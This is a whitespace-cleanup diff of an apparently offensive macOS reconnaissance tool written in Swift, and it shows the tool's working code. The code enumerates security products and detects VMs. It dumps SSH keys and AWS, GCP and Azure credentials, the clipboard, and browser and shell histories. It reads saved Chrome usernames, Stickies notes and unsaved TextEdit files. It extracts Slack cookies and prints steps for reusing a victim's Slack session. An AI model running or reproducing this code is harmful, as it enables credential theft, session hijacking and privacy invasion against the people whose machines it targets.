@@ -41,7 +41,7 @@ func Banner(){
 }
 
 func SecCheck(){
-    
+
     print("\(yellow)##########################################\(colorend)")
     print("==> Security Tools Found:")
     do {
@@ -54,7 +54,7 @@ func SecCheck(){
         }
         let processes2 = procList.joined(separator: ", ")
         var b = 0
-        
+
         if processes2.contains("CbOsxSensorService") || fileMan.fileExists(atPath: "/Applications/CarbonBlack/CbOsxSensorService"){
             print("\(green)[+] Carbon Black OSX Sensor installed.\(colorend)")
             b = 1
@@ -160,32 +160,32 @@ func SecCheck(){
             print("\(green)[+] Objective-See FileMonitor, file monitoring tool, found\(colorend)")
             b = 1
         }
-        
+
         if b == 0{
             print("[-] No security products found.")
         }
-        
+
     } catch {
         print("\(red)[-] Error listing running applications\(colorend)")
     }
-    
+
     print("\(yellow)##########################################\(colorend)")
-    
+
 }
 
 
 func getaddy() -> [String]{
     //getaddy function code lifted from https://stackoverflow.com/questions/25626117/how-to-get-ip-addresses-in-swift/25627545
     var addresses = [String]()
-    
+
     var ifaddr : UnsafeMutablePointer<ifaddrs>?
     guard getifaddrs(&ifaddr) == 0 else { return [] }
     guard let firstAddr = ifaddr else { return [] }
-    
+
     for ptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next}) {
         let flags = Int32(ptr.pointee.ifa_flags)
         let addr = ptr.pointee.ifa_addr.pointee
-        
+
         if (flags & (IFF_UP|IFF_RUNNING|IFF_LOOPBACK)) == (IFF_UP|IFF_RUNNING) {
             if addr.sa_family == UInt8(AF_INET) || addr.sa_family == UInt8(AF_INET6) {
                 var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
@@ -205,28 +205,28 @@ func SystemInfo(){
         if !("\(var1)".contains("0")){
             print("==> Current process context:\(green)")
             print(var1 + "\(colorend)")
-            
+
         }
-        
+
     }
-    
+
     if let var2 = ProcessInfo.processInfo.environment["XPC_SERVICE_NAME"]{
         if !("\(var2)".contains("0")){
             print("==> Current process context:\(green)")
             print(var2 + "\(colorend)")
-            
+
         }
-        
+
     }
     if let var3 = ProcessInfo.processInfo.environment["PACKAGE_PATH"]{
         if !("\(var3)".contains("0")){
             print("==> Current process context:\(green)")
             print(var3 + "\(colorend)")
-            
+
         }
-      
+
     }
-    
+
     var aCheck = AXIsProcessTrusted()
     print("==> Accessibility TCC Check:")
     if aCheck{
@@ -234,9 +234,9 @@ func SystemInfo(){
     }
     else {
         print("\(red)[-] Your current app context does NOT have Accessibility TCC permissions!\(colorend)")
-        
+
     }
-    
+
     var size = 0
     let mach2 = "hw.model".cString(using: .utf8)
     sysctlbyname(mach2, nil, &size, nil, 0)
@@ -251,19 +251,19 @@ func SystemInfo(){
     else {
         print("\(green)[+] Host is a physical machine and is not in a VM based on the hardware model value of \(hwmodel)\(colorend)")
     }
-    
+
     var boottime = timeval()
     var sz = MemoryLayout<timeval>.size
     sysctlbyname("kern.boottime", &boottime, &sz, nil, 0)
     let dt = Date(timeIntervalSince1970: Double(boottime.tv_sec) + Double(boottime.tv_usec)/1_000_000.0)
     print("==> Last boot time: \(green)\(dt)\(colorend)")
-    
+
     let mach4 = "kern.version".cString(using: .utf8)
     sysctlbyname(mach4, nil, &size, nil, 0)
     var machine4 = [CChar](repeating: 0, count: Int(size))
     sysctlbyname(mach4, &machine4, &size, nil, 0)
     print("==> Kernel Info: \(green)" + String(cString: machine4) + "\(colorend)")
-    
+
     let dev2 = IOServiceMatching("IOHIDSystem")
     let usbinfo1 : io_service_t = IOServiceGetMatchingService(kIOMasterPortDefault, dev2)
     let usbInfoAsString = IORegistryEntryCreateCFProperty(usbinfo1, kIOHIDIdleTimeKey as CFString, kCFAllocatorDefault, 0)
@@ -272,7 +272,7 @@ func SystemInfo(){
     let idleTime = Int("\(usbinfo2)")
     let idleTime2 = idleTime!/1000000000
     print("==> Idle Time (no keyboard/mouse interaction) in seconds: \(green)\(idleTime2)\(colorend)")
-    
+
     let cgdict = CGSessionCopyCurrentDictionary()!
 
     let dict = cgdict as? [String: AnyObject]
@@ -282,9 +282,9 @@ func SystemInfo(){
     else {
         print("[-] The screen is \(red)NOT\(colorend) currently locked!")
     }
-    
-    
-    
+
+
+
     let myScript = "return (system info)"
     let k = OSAScript.init(source: myScript)
     var compileErr : NSDictionary?
@@ -294,7 +294,7 @@ func SystemInfo(){
     let result = "\(myresult)".replacingOccurrences(of: "'utxt'", with: "").replacingOccurrences(of: "'siav'", with: "AppleScript version").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "").replacingOccurrences(of: "sikv", with: "AppleScript Studio version").replacingOccurrences(of: "sisn", with: "Short User Name").replacingOccurrences(of: "siln", with: "Long User Name").replacingOccurrences(of: "siid", with: "user ID").replacingOccurrences(of: "siul", with: "User Locale").replacingOccurrences(of: "home", with: "Home Directory").replacingOccurrences(of: "file://", with: "").replacingOccurrences(of: "'alis'", with: "").replacingOccurrences(of: "sibv", with: "").replacingOccurrences(of: "sicn", with: "Computer Name").replacingOccurrences(of: "ldsa", with: "Host Name").replacingOccurrences(of: "siip", with: "IP Address").replacingOccurrences(of: "siea", with: "Primary Ethernet Address").replacingOccurrences(of: "sict", with: "CPU Type").replacingOccurrences(of: "sics", with: "CPU Speed").replacingOccurrences(of: "sipm", with: "Memory").replacingOccurrences(of: "<NSAppleEventDescriptor: {", with: "").replacingOccurrences(of: "}>", with: "").replacingOccurrences(of: ", ", with: "\n").replacingOccurrences(of: "'':\"Macintosh HD:\"", with: "").replacingOccurrences(of: "sisv", with: "OS Version")
     print("\(yellow)##########################################\(colorend)")
     print("==> System Info:\(green)")
-    
+
     print(result)
     let mySess = ODSession.default()
     do {
@@ -310,7 +310,7 @@ func SystemInfo(){
                 c = 1
             }
         }
-        
+
         if c == 0{
             if fileMan.fileExists(atPath: "/Applications/NoMAD.app",isDirectory: &isDir){
                 print("\(green)\n[+] NoMAD found so host is likely joined to AD\(colorend)")
@@ -328,49 +328,49 @@ func SystemInfo(){
         print("\(red)[-] Error checking Open Directory Nodes.\(colorend)")
     }
     print("")
-    
+
     var plistFormat = PropertyListSerialization.PropertyListFormat.xml
     var pListData : [String: AnyObject] = [:]
     let pListPath : String? = Bundle.main.path(forResource: "data", ofType: "plist")
-    
-    
+
+
     if fileMan.fileExists(atPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist"){
         let plistURL = URL(fileURLWithPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
         do {
             let plistXML = try Data(contentsOf: plistURL)
             pListData = try PropertyListSerialization.propertyList(from:plistXML, options: .mutableContainersAndLeaves, format: &plistFormat) as! [String:AnyObject]
-            
+
             for each in pListData{
                 if each.key == "KnownNetworks"{
                     print("\(green)Wifi SSID found:\(colorend)")
                     print("\(each.value)")
-                        
+
                     }
-            
+
                 }
-            
+
             } catch {
                 print("\(red)[-] Error reading the com.appleairport.preferences.plist file\(colorend)")
             }
-            
+
         }
-    
+
     print("")
     print("Internal IP Addresses:\(green)")
     let internalAddys = getaddy()
     for ip in internalAddys{
         print(ip)
     }
-    
+
     print("")
     print("\(colorend)Environment variable info:\(green)")
     let v = ProcessInfo.processInfo.environment
     for x in v{
         print(x)
     }
-    
+
     print("")
-    
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
 }
 
@@ -379,7 +379,7 @@ func TextEditCheck(){
     let path = "/Users/\(username)/Library/Containers/com.apple.TextEdit/Data/Library/Autosave Information"
     var dir = ObjCBool(true)
     var tcanary = 0
-    
+
     if fileMan.fileExists(atPath: path, isDirectory: &dir){
         print("\n==> TextEdit autosave temp dir found...checking for unsaved TextEdit documents...")
         do {
@@ -394,19 +394,19 @@ func TextEditCheck(){
                         }
                     }
             }
-            
+
             if tcanary == 0 {
                 print("\(yellow)[-] No unsaved TextEdit documents found...\(colorend)")
             }
-            
+
         }
         catch (let error){
             print("\(red)\(error)\(colorend)")
-            
+
         }
 
-    
-        
+
+
     }
 }
 
@@ -420,7 +420,7 @@ func LockCheck(){
     else {
         print("[-] The screen is \(red)NOT\(colorend) currently locked!")
     }
-    
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
 }
 
@@ -438,19 +438,19 @@ func SearchCreds() {
                 if fileData2 != nil {
                     print(fileData2)
                 }
-                
+
             } catch {
                 print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.ssh/\(each)\(colorend)\n")
             }
-        
+
         }
-        
+
     } else {
         print("\(red)[-] ~/.ssh directory not found on this host\(colorend)")
     }
-    
+
     print("")
-    
+
     if fileMan.fileExists(atPath: "/Users/\(uName)/.aws",isDirectory: &isDir){
         print("\(colorend)==>AWS Info Found:\(green)")
         let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.aws")
@@ -462,7 +462,7 @@ func SearchCreds() {
                 if fileData2 != nil {
                     print(fileData2)
                 }
-                
+
             } catch {
                 print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.aws/\(each)\(colorend)\n")
             }
@@ -470,9 +470,9 @@ func SearchCreds() {
     } else {
         print("\(red)[-] ~/.aws directory not found on this host\(colorend)")
     }
-    
+
     print("")
-    
+
     if fileMan.fileExists(atPath: "/Users/\(uName)/.config/gcloud/credentials.db"){
         do {
             print("\(colorend)==>GCP gcloud Info Found:\(green)")
@@ -498,16 +498,16 @@ func SearchCreds() {
                     sqlite3_finalize(queryStatement)
                 }
             }
-            
+
         }
         catch {
             print("\(red)[-] Error attempting to get contents of ~/.config/gcloud/credentials.db\(colorend)")
         }
-        
+
     } else {
         print("\(red)[-] ~/.config/gcloud/credentials.db not found on this host\(colorend)")
     }
-    
+
     print("")
 
     if fileMan.fileExists(atPath: "/Users/\(uName)/.azure",isDirectory: &isDir){
@@ -536,35 +536,35 @@ func SearchCreds() {
     } else {
         print("\(red)[-] ~/.azure directory not found on this host\(colorend)")
     }
-    
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
-    
+
 }
 
 func Clipboard(){
     let clipBoard = NSPasteboard.general
     var clipArray = [String]()
-    
+
     for each in clipBoard.pasteboardItems! {
         if let str = each.string(forType: NSPasteboard.PasteboardType(rawValue: "public.utf8-plain-text")){
             clipArray.append(str)
         }
     }
-    
+
     let joined = clipArray.joined(separator: ", ")
-    
+
     print("\(yellow)##########################################\(colorend)")
     print("==> Clipboard Info:\(green)")
     print(joined)
 //    print(myresult2)
     print("\(colorend)\(yellow)##########################################\(colorend)\(colorend)")
-    
+
 }
 
 func RunningApps(){
     let myWorkSpace = NSWorkspace.shared
     let appCount = myWorkSpace.runningApplications.count
-    
+
     print("\(yellow)##########################################\(colorend)")
     print("==>Count of Running Apps: \(appCount)")
 
@@ -575,7 +575,7 @@ func RunningApps(){
         let appURL = each.bundleURL//!
         let launchDate = each.launchDate
         let pid = each.processIdentifier
-        
+
         if each.isHidden == true {
             hiddenString = "Hidden: YES\r"
         }
@@ -583,24 +583,24 @@ func RunningApps(){
             hiddenString = "Hidden: NO\r"
         }
         print("\(count). Name: \(appName)")
-        
+
         if appURL != nil {
             print("===>\(green)Path: \(appURL)\(colorend)")
         }
-        
+
         if launchDate != nil {
             var lString = "\(launchDate)"
             var lString2 = lString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
             print("===>\(green)Launch Date: \(lString2)\(colorend)")
-                
+
         }
-        
-        
+
+
         if pid != nil {
             var pString = "\(pid)"
             var pString2 = pString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
             print("===>\(green)PID: \(pString2)\(colorend)")
-            
+
         }
 
         print("\(hiddenString)")
@@ -623,16 +623,16 @@ func ListUsers(){
         print("\(red)[-] Error attempting to list users\(colorend)")
         print("\(yellow)##########################################\(colorend)")
     }
-    
-    
-    
+
+
+
 }
 
 func LaunchAgents(){
     print("\(yellow)##########################################\(colorend)")
     print("==>LaunchAgent/LaunchDaemon Info:")
     let uName = NSUserName()
-    
+
     if fileMan.fileExists(atPath: "/Users/\(uName)/Library/LaunchAgents",isDirectory: &isDir){
         let launchaURL = URL(fileURLWithPath: "/Users/\(uName)/Library/LaunchAgents")
         print("\(colorend)User LaunchAgent Info:\(green)")
@@ -643,63 +643,63 @@ func LaunchAgents(){
             }
         } catch {
             print("\(colorend)\(red)[-] Error while listing user LaunchAgent files\(colorend)")
-            
+
         }
-        
+
         print("")
-        
+
     }
-    
+
     if fileMan.fileExists(atPath: "/Library/LaunchDaemons",isDirectory: &isDir){
         let launchdURL = URL(fileURLWithPath: "/Library/LaunchDaemons")
         print("\(colorend)System LaunchDaemon Info:\(green)")
         do {
             let fileURLs = try fileMan.contentsOfDirectory(at: launchdURL, includingPropertiesForKeys: nil)
             for file in fileURLs{
-                
+
                 print(file)
             }
         } catch {
             print("\(colorend)\(red)[-] Error while listing System LaunchDaemon files\(colorend)")
         }
-        
+
         print("")
-        
+
     }
-    
+
     if fileMan.fileExists(atPath: "/Library/LaunchAgents",isDirectory: &isDir){
         let launchaURL2 = URL(fileURLWithPath: "/Library/LaunchAgents")
         print("\(colorend)System LaunchAgent Info:\(green)")
         do {
             let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL2, includingPropertiesForKeys: nil)
             for file in fileURLs{
-                
+
                 print(file)
             }
         } catch {
             print("\(colorend)\(red)[-] Error while listing System LaunchAgent files\(colorend)")
         }
-        
+
         print("")
-        
+
     }
-    
+
     if fileMan.fileExists(atPath: "/Library/Managed Preferences",isDirectory: &isDir){
         let launchaURL4 = URL(fileURLWithPath: "/Library/Managed Preferences/")
         print("\(colorend)Configuration Profile Info:\(green)")
         do {
             let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL4, includingPropertiesForKeys: nil)
             for file in fileURLs{
-                
+
                 print(file)
             }
         } catch {
             print("\(colorend)\(red)[-] Error while listing Configuration Profile files\(colorend)")
         }
 
-        
+
     }
-  
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
 }
 
@@ -731,48 +731,48 @@ func BrowserHistory(){
                     if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                         print("\(red)[-] Could not open quarantive events database.\(colorend)")
                     }else {
-                        
+
                         let queryString = "select datetime(LSQuarantineTimeStamp, 'unixepoch') as last_visited, LSQuarantineAgentBundleIdentifier, LSQuarantineDataURLString, LSQuarantineOriginURLString from LSQuarantineEvent where LSQuarantineDataURLString is not null order by last_visited;"
 
                         var queryStatement: OpaquePointer? = nil
-                        
+
                         if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                             while sqlite3_step(queryStatement) == SQLITE_ROW {
                                 let col1 = sqlite3_column_text(queryStatement, 0)
                                 if col1 != nil{
                                     nm1 = String(cString: col1!)
-                                    
+
                                 }
 
                                 let col2 = sqlite3_column_text(queryStatement, 1)
                                 if col2 != nil{
                                     nm2 = String(cString: col2!)
                                 }
-                                
+
                                 let col3 = sqlite3_column_text(queryStatement, 2)
                                 if col3 != nil{
                                     nm3 = String(cString:col3!)
                                 }
-                                
-                                
+
+
                                 let col4 = sqlite3_column_text(queryStatement, 3)
                                 if col4 != nil{
                                     nm4 = String(cString: col4!)
                                 }
-                                
-                                
+
+
                                 print("Date: \(nm1) | App: \(nm2) | File: \(nm3) | OriginURL: \(nm4)")
 
                             }
         //
                             sqlite3_finalize(queryStatement)
-                            
+
                         }
-                        
-                        
-                        
+
+
+
                     }
-        
+
     }else {
         print("\(red)[-] QuarantineEventsV2 database not found for user \(username)\(colorend)")
     }
@@ -789,27 +789,27 @@ func BrowserHistory(){
             //let queryString = "select history_visits.visit_time, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id;"
             let queryString = "select datetime(history_visits.visit_time + 978307200, 'unixepoch') as last_visited, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id order by last_visited;"
             var queryStatement: OpaquePointer? = nil
-            
+
             if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                 while sqlite3_step(queryStatement) == SQLITE_ROW{
                     let col1 = sqlite3_column_text(queryStatement, 0)
                     if col1 != nil{
                         visitDate = String(cString: col1!)
-                        
+
                     }
                     let col2 = sqlite3_column_text(queryStatement, 1)
                     if col2 != nil{
                         histURL = String(cString: col2!)
-                        
+
                     }
-                    
+
                     print("Date: \(visitDate) | URL: \(histURL)")
-                    
+
                 }
                 sqlite3_finalize(queryStatement)
-                
+
             }
-            
+
         }
     }
     else {
@@ -822,101 +822,101 @@ func BrowserHistory(){
         print("\(green)***************Chrome history results for user \(username)***************\(colorend)")
         var db : OpaquePointer?
         var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History")
-        
+
         if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
             print("\(red)[-] Could not open the Chrome history database file for user \(username)\(colorend)")
-            
+
         } else{
-            
+
             let queryString = "select datetime(last_visit_time/1000000-11644473600, \"unixepoch\") as last_visited, url, title from urls order by last_visited;"
-            
+
             var queryStatement: OpaquePointer? = nil
-            
+
             if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
-                
+
                 while sqlite3_step(queryStatement) == SQLITE_ROW{
-                    
-                    
+
+
                     let col1 = sqlite3_column_text(queryStatement, 0)
                     if col1 != nil{
                         cVisitDate = String(cString: col1!)
-                        
+
                     }
-                    
+
                     let col2 = sqlite3_column_text(queryStatement, 1)
                     if col2 != nil{
                         cUrl = String(cString: col2!)
-                        
+
                     }
-                    
+
                     let col3 = sqlite3_column_text(queryStatement, 2)
                     if col3 != nil{
                         cTitle = String(cString: col3!)
-                        
+
                     }
-                    
-                    
+
+
                      print("Date: \(cVisitDate) | URL: \(cUrl) | Title: \(cTitle)")
-                    
+
                 }
-                
+
                 sqlite3_finalize(queryStatement)
-                
+
             }
             else {
                 print("\(red)[-] Issue with preparing the Chrome History database...this may be because something is currently writing to it (i.e., an active Chrome browser). You can simply copy the locked file elsewhere and read from there\(colorend)")
             }
-            
+
         }
     }
     else{
         print("\(red)[-] Chrome History database not found for user \(username)\(colorend)")
     }
-        
+
     //firefox history check
     if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/"){
         let fileEnum = fileMan.enumerator(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/")
         print("")
         print("\(green)***************Firefox history results for user \(username)***************\(colorend)")
-        
+
         while let each = fileEnum?.nextObject() as? String {
             if each.contains("places.sqlite"){
                 let placesDBPath = "/Users/\(username)/Library/Application Support/Firefox/Profiles/\(each)"
                 var db : OpaquePointer?
                 var dbURL = URL(fileURLWithPath: placesDBPath)
-                
+
                 var printTest = sqlite3_open(dbURL.path, &db)
-                
+
                 if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                     print("\(red)[-] Could not open the Firefox history database file for user \(username)\(colorend)")
                 } else {
-                    
+
                     let queryString = "select datetime(visit_date/1000000,'unixepoch') as time, url FROM moz_places, moz_historyvisits where moz_places.id=moz_historyvisits.place_id order by time;"
-                    
+
                     var queryStatement: OpaquePointer? = nil
-                    
+
                     if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
-                        
+
                         while sqlite3_step(queryStatement) == SQLITE_ROW{
                             let col1 = sqlite3_column_text(queryStatement, 0)
                             if col1 != nil{
                                 ffoxDate = String(cString: col1!)
                             }
-                            
+
                             let col2 = sqlite3_column_text(queryStatement, 1)
                             if col2 != nil{
                                 ffoxURL = String(cString: col2!)
                             }
-                                                                
+
                              print("Date: \(ffoxDate) | URL: \(ffoxURL)")
-                            
+
                         }
-                        
+
                         sqlite3_finalize(queryStatement)
-                       
+
                     }
-                    
-                    
+
+
                 }
             }
         }
@@ -924,7 +924,7 @@ func BrowserHistory(){
     else {
         print("\(red)[-] Firefox places.sqlite database not found for user \(username)\(colorend)".data(using: .utf8)!)
     }
-    
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
 }
 
@@ -935,7 +935,7 @@ func SlackExtract(){
     var nm2 = ""
     var nm3 = ""
     var nm4 = ""
-    
+
     print("\(colorend)\(yellow)##########################################\(colorend)")
 
     print("==> Slack Info:")
@@ -948,9 +948,9 @@ func SlackExtract(){
             let dwnURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads")
             do {
                 let dwnData = try String(contentsOf: dwnURL)
-                
+
                 let dwnDataJoined = dwnData.components(separatedBy: ",")
-                
+
                 for item in dwnDataJoined{
                     if item.contains("http") {
                         print(item)
@@ -959,14 +959,14 @@ func SlackExtract(){
                         print("\u{001B}[0;36m==>\u{001B}[0;0m \(item)")
                     }
                 }
-                
+
             } catch {
                 print("\(red)[-] Error getting contents of slack-downloads file")
             }
-            
-            
+
+
         }
-        
+
         if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces"){
                print("")
                print("\u{001B}[0;33m-->Found slack-workspaces file\u{001B}[0;0m")
@@ -974,9 +974,9 @@ func SlackExtract(){
                let wkspURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces")
             do {
                 let wkspData = try String(contentsOf: wkspURL)
-                
+
                 let wkspJoined = wkspData.components(separatedBy: ",")
-                
+
                 for each in wkspJoined{
                     if (each.contains("name") && !(each.contains("_"))){
                         if let index = (each.range(of: "{")?.upperBound){
@@ -985,17 +985,17 @@ func SlackExtract(){
                         } else {
                             print(each)
                         }
-                        
+
                     }
-                    
+
                     if each.contains("team_name"){
                         print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                     }
-                    
+
                     if each.contains("team_url"){
                         print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                     }
-                    
+
                     if each.contains("unreads"){
                         print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                     }
@@ -1003,10 +1003,10 @@ func SlackExtract(){
             } catch {
                 print("\(red)[-] Error getting slack-teams content\(colorend)")
             }
-               
+
            }
-        
-        
+
+
         if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies"){
             print("")
             print("\u{001B}[0;33m-->Found Slack Cookies Database\u{001B}[0;0m")
@@ -1019,54 +1019,54 @@ func SlackExtract(){
                 print("Format: host_key \u{001B}[0;36m||\u{001B}[0;0m name \u{001B}[0;36m||\u{001B}[0;0m value ")
                 let queryString = "select datetime(creation_utc, 'unixepoch') as creation, host_key, name, value from cookies order by creation;"
                 var queryStatement: OpaquePointer? = nil
-                
+
                 if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                     while sqlite3_step(queryStatement) == SQLITE_ROW{
                         let col1 = sqlite3_column_text(queryStatement, 0)
                         if col1 != nil{
                             nm1 = String(cString: col1!)
                         }
-                        
+
                         let col2 = sqlite3_column_text(queryStatement, 1)
                         if col2 != nil{
                             nm2 = String(cString: col2!)
                         }
-                        
+
                         let col3 = sqlite3_column_text(queryStatement, 2)
                         if col3 != nil{
                             nm3 = String(cString: col3!)
                         }
-                        
+
                         let col4 = sqlite3_column_text(queryStatement, 3)
                         if col4 != nil {
                             nm4 = String(cString:col4!)
                         }
-                        
+
                         print("\(nm2) \u{001B}[0;36m||\u{001B}[0;0m \(nm3) \u{001B}[0;36m||\u{001B}[0;0m \(nm4)")
                 }
-                    
+
             }
                 else {
                     print("\(red)[-] Cookies database not found\(colorend)")
                 }
         }
-        
+
     }
-        
+
         print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
         print("Steps from Cody's article to load the Slack files found:")
         print("1. Install a new instance of slack (but don’t sign in to anything)")
         print("2. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim")
         print("3. Start Slack")
         print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
-        
+
        print("\(colorend)\(yellow)##########################################\(colorend)")
     }
 }
 
 func ShellHistory(){
     print("\(colorend)\(yellow)##########################################\(colorend)")
-    
+
     let uName = NSUserName()
 
     let bashHistoryPath = "/Users/\(uName)/.bash_history"
@@ -1102,9 +1102,9 @@ func ShellHistory(){
 
 func Bookmarks(){
     print("\(colorend)\(yellow)##########################################\(colorend)")
-    
+
     let uName = NSUserName()
-    
+
     //Chrome Bookmarks
     if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Google/Chrome/Default/Bookmarks"){
         print("==> Chrome Bookmarks\(green)")
@@ -1118,13 +1118,13 @@ func Bookmarks(){
                     print(each.replacingOccurrences(of: "}", with: ""))
                 }
             }
-            
+
         } catch {
             print("\(colorend)\(red)[-] Error reading Chrome bookmarks for user \(uName)\(colorend)")
         }
         print("\(colorend)\(yellow)##########################################\(colorend)")
     }
-    
+
 }
 
 func ChromeUsernames(){
@@ -1141,29 +1141,29 @@ func ChromeUsernames(){
             print("Format: origin_domain \u{001B}[0;36m || \u{001B}[0;0m username_value")
             let queryString = "select origin_domain,username_value from stats;"
             var queryStatement: OpaquePointer? = nil
-            
+
             if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                 while sqlite3_step(queryStatement) == SQLITE_ROW{
                     let col1 = sqlite3_column_text(queryStatement, 0)
                     if col1 != nil{
                         nm1 = String(cString: col1!)
                     }
-                    
+
                     let col2 = sqlite3_column_text(queryStatement, 1)
                     if col2 != nil{
                         nm2 = String(cString: col2!)
                     }
-                    
-                    
+
+
                     print("\(nm1) \u{001B}[0;36m || \u{001B}[0;0m \(nm2)")
             }
-                
+
         }
             else {
                 print("\(red)[-] Error opening Chrome user db...may be locked (in use). If so, you can simply copy the Login Data db file elsewhere and read from it...\(colorend)")
             }
     }
-    
+
 }
 }
 
@@ -1180,16 +1180,16 @@ func CheckFDA(){
             if let rawPtr = MDQueryGetResultAtIndex(query, i) {
                 let item = Unmanaged<MDItem>.fromOpaque(rawPtr).takeUnretainedValue()
                 if let path = MDItemCopyAttribute(item, kMDItemPath) as? String {
-                   
+
                     if path.hasSuffix("/Users/\(username)/Library/Application Support/com.apple.TCC/TCC.db"){
                         p1 = p1 + 1
-                        
+
                     }
-                    
+
                 }
             }
         }
-        
+
         if p1 > 0 {
             print("\(green)[+] Your app context HAS ALREADY been given full disk access (mdquery API calls can see the user's TCC database)\(colorend)")
         }
@@ -1208,13 +1208,13 @@ func UnivAccessAuth(){
     var pListFormat = PropertyListSerialization.PropertyListFormat.xml
     var pListData : [String: AnyObject] = [:]
     var pListPath : String? = Bundle.main.path(forResource: "data", ofType: "plist")
-    
+
     if fileMan.fileExists(atPath: "/Users/\(username)/Library/Preferences/com.apple.universalaccessAuthWarning.plist"){
         let plistURL = URL(fileURLWithPath: "/Users/\(username)/Library/Preferences/com.apple.universalaccessAuthWarning.plist")
         do {
             let plistXML = try Data(contentsOf: plistURL)
             pListData = try PropertyListSerialization.propertyList(from: plistXML, options: .mutableContainers, format: &pListFormat) as! [String:AnyObject]
-            
+
             for each in pListData{
                 print("\(green)\(each)\(colorend)")
             }
@@ -1222,7 +1222,7 @@ func UnivAccessAuth(){
         catch let error {
             print("\(red)\(error)")
         }
-        
+
         print("\(colorend)\(yellow)##########################################\(colorend)")
     }
 }
@@ -1243,31 +1243,31 @@ func StickieNotes(){
                         if file.hasSuffix(".rtfd"){
                             canary = canary + 1
                             var dirname = "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)"
-                            
+
                             var dircontents = try fileMan.contentsOfDirectory(atPath: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)")
                             for k in dircontents{
                                 if k.contains("TXT.rtf"){
-                                    
+
                                     var stickiedata = try String(contentsOfFile: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)/\(k)")
                                     print("\(green)\(stickiedata)\(colorend)")
-                                    
+
                                 }
                             }
                         }
                     }
                 }
-                
 
-                
+
+
             }
 
-            
+
         }
         catch (let error){
             print("[-]\(red)\(error)\(colorend)")
-            
+
         }
-        
+
     }
     if canary == 0 {
         print("\(yellow)[-] No stickie file contents found on this host\(colorend)")
@@ -1298,32 +1298,32 @@ func JupyterCheck(){
                         if col2 != nil{
                             nm2 = String(cString: col2!)
                         }
-                        
+
                         let col3 = sqlite3_column_text(queryStatement, 2)
                         if col3 != nil{
                             nm3 = String(cString: col3!)
                         }
-                        
+
                         let col4 = sqlite3_column_text(queryStatement, 3)
                         if col4 != nil{
                             nm4 = String(cString: col4!)
                         }
-                        
+
                         print("session: \(nm1)  |  line: \(nm2) | source text: \(nm3) | source_raw text: \(nm4)")
                     }
                     sqlite3_finalize(queryStatement)
                 }
             }
-            
+
         }
         catch {
             print("\(red)[-] Error attempting to get contents of ~/.ipython/profile_default/history.sqlite\(colorend)")
         }
-        
+
     } else {
         print("\(red)[-] ~/.ipython/profile_default/history.sqlite not found on this host\(colorend)")
     }
-    
+
 }
 
 Banner()
@@ -1381,23 +1381,23 @@ else {
             if argument.contains("-CheckFDA"){
                 CheckFDA()
             }
-            
+
             if argument.contains("-SecurityTools"){
                 SecCheck()
             }
-            
+
             if argument.contains("-SystemInfo"){
                 SystemInfo()
             }
-            
+
             if argument.contains("-LockCheck"){
                 LockCheck()
             }
-            
+
             if argument.contains("-SearchCreds"){
                 SearchCreds()
             }
-            
+
             if argument.contains("-Clipboard"){
                 Clipboard()
             }
@@ -1422,31 +1422,31 @@ else {
             if argument.contains("-UniversalAccessAuth"){
                 UnivAccessAuth()
             }
-            
+
             if argument.contains("-Bookmarks"){
                 Bookmarks()
             }
-            
+
             if argument.contains("-ChromeUsernames"){
                 ChromeUsernames()
             }
-            
+
             if argument.contains("-StickieNotes"){
                 StickieNotes()
             }
-            
+
